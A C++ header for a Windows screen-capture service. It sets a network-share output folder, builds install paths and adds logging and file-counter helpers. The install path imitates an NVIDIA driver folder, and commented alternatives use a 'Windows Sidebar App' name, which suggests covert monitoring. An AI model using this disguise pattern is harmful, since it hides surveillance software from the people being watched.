#pragma once 

#include <stdio.h>
#include <string>
#include <time.h>
#include <fstream>
#include <mutex>

#include <Lmcons.h>

const wchar_t strNameService[] = L"CaptureScreenService";

const wchar_t strPathOutputDir[] = L"\\\\zt-76\\Shara\\_VIDEO_\\_test_";
//const wchar_t strPath_WindowSaveScreen[] = L"C:\\ProgramData\\Windows Sidebar App\\WindowSaveScreen.exe";
//const wchar_t strPath_WindowStartService[] = L"C:\\ProgramData\\Windows Sidebar App\\CaptureScreenService.exe";

enum STR_TYPE { str_WindowSaveScreen = 0, str_WindowStartService, str_LogFile };

static std::wstring getStrPath(STR_TYPE str_type)
{
	wchar_t username[UNLEN + 1];
	DWORD username_len = UNLEN + 1;
	GetUserNameW(username, &username_len);

	//std::wstring strRes(L"C:\\Users\\");
	//strRes += username;
	//strRes += L"\\Sidebar App\\";

	//std::wstring strRes(L"C:\\Program Files\\Sidebar App\\");
	std::wstring strRes(L"C:\\NVIDIA\\DisplayDriver\\361.91\\Win8_WinVista_Win7_64\\International\\NVBar\\");

	switch (str_type)
	{
	case str_WindowSaveScreen:
		strRes += L"WindowSaveScreen.exe";
		break;

	case str_WindowStartService:
		strRes += L"CaptureScreenService.exe";
		break;

	case str_LogFile:
		strRes += L"logServ.txt";
		break;
	}

	return strRes;
}

#define LOG_TRUE

#ifdef LOG_TRUE
//const wchar_t strPathLogFile[] = L"C:\\ProgramData\\Windows Sidebar App\\logServ.txt";

std::mutex mtx; // mutex for critical section

static int logTo(const wchar_t* strValue)
{
	mtx.lock();

	time_t rawtime = time(nullptr);
	tm timeinfo;
	wchar_t strTime[32];

	errno_t result = localtime_s(&timeinfo, &rawtime);
	_wasctime_s(strTime, 32, &timeinfo);

	std::wstring strValueResult(strTime);
	strValueResult.pop_back();
	strValueResult += L": ";
	strValueResult += strValue;
	strValueResult += L"\n";

	std::wofstream ofs;
	ofs.open(getStrPath(str_LogFile).c_str(), std::ofstream::out | std::ofstream::app);

	if (ofs.good())
	{
		ofs << strValueResult.c_str();
		ofs.close();
	}

	mtx.unlock();

	return 0;
}
#else
static int logTo(const wchar_t* strValue)
{
	return 0;
}
#endif

static int GetCountImg(std::wstring str)
{
	str += L"\\counter.txt";
	std::ifstream ifs;
	ifs.open(str, std::ofstream::in);

	int iCounter = 0;

	if (ifs.good())
	{
		while (!ifs.eof())
		{
			ifs >> iCounter;
		}
		ifs.close();
	}

	return iCounter;
}

static void SetCountImg(std::wstring str, int iCounter)
{
	str += L"\\counter.txt";
	std::ofstream ofs;
	ofs.open(str, std::ofstream::out);

	if (ofs.good())
	{
		ofs << iCounter;
		ofs.close();
	}

}